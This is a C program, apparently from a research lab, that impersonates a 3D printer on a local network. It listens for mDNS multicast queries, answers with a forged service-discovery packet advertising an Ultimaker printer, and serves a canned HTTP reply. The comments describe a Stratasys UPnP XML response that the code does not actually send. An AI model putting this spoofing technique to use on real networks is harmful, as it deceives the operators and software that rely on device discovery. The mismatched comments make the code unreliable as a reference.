/*
 * Author: Curtis R. Taylor (ORNL)
 * Date: 08/27/2020
 * Info: Targets uPrint printer + Catalyst software
 */

#include "../netreach_unix.h"
#include <stdio.h>
#include <netdb.h>

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define LPORT "80"
#define BACKLOG 10
#define PRINTERIP "192.168.8.180"

void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

void send_udp_uni(){

	// (1) listen to SSDP broadcast, (2) extract port from request, and (3) send response

	// FIRST
	// source started from: http://www.cs.tau.ac.il/~eddiea/samples/Multicast/multicast-listen.c.html
	int send_s, recv_s;     /* Sockets for sending and receiving. */
	u_int yes = 1;
	
	struct ip_mreq mreq;
	struct sockaddr_in mcast_group;
	struct sockaddr_in from;
	memset(&mcast_group, 0, sizeof(mcast_group));
	mcast_group.sin_family = AF_INET;
	mcast_group.sin_port = htons(5353);
	mcast_group.sin_addr.s_addr = inet_addr("224.0.0.251"); //"224.0.0.251"

	if ( (recv_s=socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		perror ("recv socket");
		exit(1);
	}

	if (setsockopt(recv_s, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0) {
		perror("reuseaddr setsockopt");
		exit(1);
	}

	if (bind(recv_s, (struct sockaddr*)&mcast_group, sizeof(mcast_group)) < 0) {
		perror ("bind");
		exit(1);
	}

	/* Preparatios for using Multicast */
	mreq.imr_multiaddr = mcast_group.sin_addr;
	mreq.imr_interface.s_addr = htonl(INADDR_ANY);

	/* Tell the kernel we want to join that multicast group. */
	if (setsockopt(recv_s, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0) {
		perror ("add_membership setsockopt");
		exit(1);
	}

	printf("[INFO] Listening for multicast\n");
	int n;
	char message [1024];
	socklen_t len = sizeof(from);
	if ( (n=recvfrom(recv_s, message, 1024, 0,
		(struct sockaddr*)&from, &len)) < 0) {
		perror ("recv");
		exit(1);
	}
	int target_port = from.sin_port;
	printf("Received message from %s, size=%d and target_port: %d!!\n",
			inet_ntoa(from.sin_addr), n, ntohs(target_port));


	int sockfd;
	const char *msg = {
"\x00\x00\x84\x00\x00\x01\x00\x05"
"\x00\x00\x00\x00\x0a\x5f\x75\x6c"
"\x74\x69\x6d\x61\x6b\x65\x72\x04" 
"\x5f\x74\x63\x70\x05\x6c\x6f\x63" 
"\x61\x6c\x00\x00\x0c\x80\x01\xc0"
"\x0c\x00\x0c\x00\x01\x00\x00\x00" 
"\x3c\x00\x1f\x1c\x75\x6c\x74\x69" 
"\x6d\x61\x6b\x65\x72\x73\x79\x73" 
"\x74\x65\x6d\x2d\x30\x30\x33\x30"
"\x64\x36\x32\x34\x35\x38\x64\x38"
"\xc0\x0c\xc0\x33\x00\x10\x00\x01" 
"\x00\x00\x00\x3c\x00\xb6\x0e\x63" 
"\x6c\x75\x73\x74\x65\x72\x5f\x73" 
"\x69\x7a\x65\x3d\x31\x0d\x6e\x61" 
"\x6d\x65\x3d\x63\x6f\x72\x64\x65" 
"\x6c\x69\x61\x0c\x74\x79\x70\x65" 
"\x3d\x70\x72\x69\x6e\x74\x65\x72"
"\x10\x6d\x61\x63\x68\x69\x6e\x65"
"\x3d\x32\x31\x33\x34\x38\x32\x2e"
"\x32\x16\x66\x69\x72\x6d\x77\x61"
"\x72\x65\x5f\x76\x65\x72\x73\x69"
"\x6f\x6e\x3d\x36\x2e\x35\x2e\x31"
"\x14\x68\x6f\x74\x65\x6e\x64\x5f"
"\x74\x79\x70\x65\x5f\x30\x3d\x41"
"\x41\x20\x30\x2e\x34\x1c\x68\x6f"
"\x74\x65\x6e\x64\x5f\x73\x65\x72"
"\x69\x61\x6c\x5f\x30\x3d\x36\x33"
"\x65\x64\x63\x33\x33\x35\x30\x30"
"\x30\x30\x14\x68\x6f\x74\x65\x6e"
"\x64\x5f\x74\x79\x70\x65\x5f\x31"
"\x3d\x41\x41\x20\x30\x2e\x34\x1c"
"\x68\x6f\x74\x65\x6e\x64\x5f\x73"
"\x65\x72\x69\x61\x6c\x5f\x31\x3d"
"\x33\x30\x39\x35\x63\x33\x33\x35"
"\x30\x30\x30\x30\xc0\x33\x00\x21"
"\x00\x01\x00\x00\x00\x3c\x00\x25"
"\x00\x00\x00\x00\x00\x50\x1c\x75"
"\x6c\x74\x69\x6d\x61\x6b\x65\x72"
"\x73\x79\x73\x74\x65\x6d\x2d\x30"
"\x30\x33\x30\x64\x36\x32\x34\x35"
"\x38\x64\x38\xc0\x1c\xc1\x26\x00"
"\x1c\x00\x01\x00\x00\x00\x3c\x00"
"\x10\xfe\x80\x00\x00\x00\x00\x00"
"\x00\x02\x0e\x8e\xff\xfe\x96\xef"
"\x95\xc1\x26\x00\x01\x00\x01\x00"
"\x00\x00\x3c\x00\x04\xc0\xa8\x08"
"\xb4\xb5" }; // \xb5

	struct sockaddr_in     servaddr;
	// Creating socket file descriptor
	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}

	memset(&servaddr, 0, sizeof(servaddr));

	// Filling server information
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = target_port;
	servaddr.sin_addr.s_addr = inet_addr(inet_ntoa(from.sin_addr)); //inet_addr(PRINTERIP);

	/* Send the message in buf to the server */
	printf("sending initial msg to printer\n");
	if (sendto(sockfd, msg, 370, 0, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
		perror("sendto()");
		exit(2);
	}
	close(sockfd);
	close(recv_s);
}

int main(void)
{
	struct sockaddr_storage their_addr;
	socklen_t addr_size;
	socklen_t sin_size;
	struct addrinfo hints, *res;
	int sockfd, new_fd;
	char s[INET6_ADDRSTRLEN];
	int yes=1;


	// first, load up address structs with getaddrinfo():
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;     // fill in my IP for me

	getaddrinfo(NULL, LPORT, &hints, &res);

	// make a socket, bind it, and listen on it:
	sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

	if(bind(sockfd, res->ai_addr, res->ai_addrlen) != 0){
		perror("bind");
	}
	if(listen(sockfd, BACKLOG) != 0){
		perror("listen");
	}

	// now accept an incoming connection:

	// BEFORE TCP, we need to send the multicast
	send_udp_uni();

	printf("waiting for client...\n");
	while(1) {  // main accept() loop
		sin_size = sizeof their_addr;
		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
		if (new_fd == -1) {
			perror("accept");
			continue;
		}

		struct timeval timeVal;
		timeVal.tv_sec =  1; // Seconds
		timeVal.tv_usec = 0; // Microseconds. 10000 microseconds resolution
		int status = setsockopt(new_fd ,SOL_SOCKET,SO_RCVTIMEO, (uint8_t*)&timeVal, sizeof(timeVal));

		inet_ntop(their_addr.ss_family,
				get_in_addr((struct sockaddr *)&their_addr),
				s, sizeof s);
		printf("server: got connection from %s\n", s);

		pid_t pid, w;
		pid = fork();
		if (pid == 0) { // this is the child process
			close(sockfd); // child doesn't need the listener
			char http_get[256]; // around 102 bytes in PCAP

			int bytes = recv(new_fd, http_get, 256, 0);

			if(bytes < 75){ // TODO need to ensure we receive a full valid request...
				fprintf(stderr, "[ERROR]not enough data\n");
				exit(-1);
			}

			// RECEIVE SOMETHING LIKE THIS
			// GET / HTTP/1.0
			// Host: 192.168.3.81:53743
			// User-Agent: WINDOWS, UPnP/1.0, Intel MicroStack/1.0.1725

			// send hard coded response like
			// HTTP/1.0 200 OK
			// CONTENT-TYPE:  text/xml; charset="utf-8"
			// Server: POSIX, UPnP/1.0, Stratasys Modeler/1.0
			//<?xml version="1.0" encoding="utf-8"?>
			//<root xmlns="urn:schemas-upnp-org:device-1-0" xmlns:ssys="urn:stratasys-com:upnp-exts">
			//   <specVersion>
			//      <major>1</major>
			//      <minor>0</minor>
			//   </specVersion>
			//   <device>
			//      <deviceType>urn:stratasys-com:device:StratasysModeler:1</deviceType>
			//      <friendlyName>uprintP51572</friendlyName>
			//      <manufacturer>Stratasys, Inc.</manufacturer>
			//      <modelName>uprint</modelName>
			//      <serialNumber>P51572</serialNumber>
			//      <UDN>uuid:uprintP51572</UDN>
			//      <ssys:X_IPAddress>192.168.3.81</ssys:X_IPAddress> // CHANGED FROM 91
			//   </device>
			//</root>

			const char *http_res = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20\x4f\x4b\x0a\x53\x65\x72\x76\x65\x72\x3a\x20\x6e\x67\x69\x6e\x78\x2f\x31\x2e\x31\x34\x2e\x32\x0a\x44\x61\x74\x65\x3a\x20\x57\x65\x64\x2c\x20\x31\x39\x20\x4d\x61\x79\x20\x32\x30\x32\x31\x20\x30\x30\x3a\x32\x37\x3a\x31\x38\x20\x47\x4d\x54\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x31\x30\x36\x34\x36\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65\x0a\x43\x61\x63\x68\x65\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x3a\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65\x2c\x20\x6e\x6f\x2d\x73\x74\x6f\x72\x65\x2c\x20\x6d\x75\x73\x74\x2d\x72\x65\x76\x61\x6c\x69\x64\x61\x74\x65\x0a\x50\x72\x61\x67\x6d\x61\x3a\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65\x0a\x45\x78\x70\x69\x72\x65\x73\x3a\x20\x30\x0a\x0a";
			int bytes_sent = 0;
			while (bytes_sent < strlen(http_res)){
				int bsent = send(new_fd, http_res, strlen(http_res), 0);
				if(bsent < 0){
					perror("send");
				}
				else{
					bytes_sent += bsent;
				}
			}
			exit(0);

		}
		else {
			close(new_fd);  // parent doesn't need this
			do {
				int w = waitpid(pid, &status, WUNTRACED | WCONTINUED);
				if (w == -1) {
					perror("waitpid");
					exit(EXIT_FAILURE);
				}

				if (WIFEXITED(status)) {
					printf("exited, status=%d\n", WEXITSTATUS(status));
				} else if (WIFSIGNALED(status)) {
					printf("killed by signal %d\n", WTERMSIG(status));
				} else if (WIFSTOPPED(status)) {
					printf("stopped by signal %d\n", WSTOPSIG(status));
				} else if (WIFCONTINUED(status)) {
					printf("continued\n");
				}
			} while (!WIFEXITED(status) && !WIFSIGNALED(status));
		}
        break; // we don't need to loop right now
	}

	return 0;
}
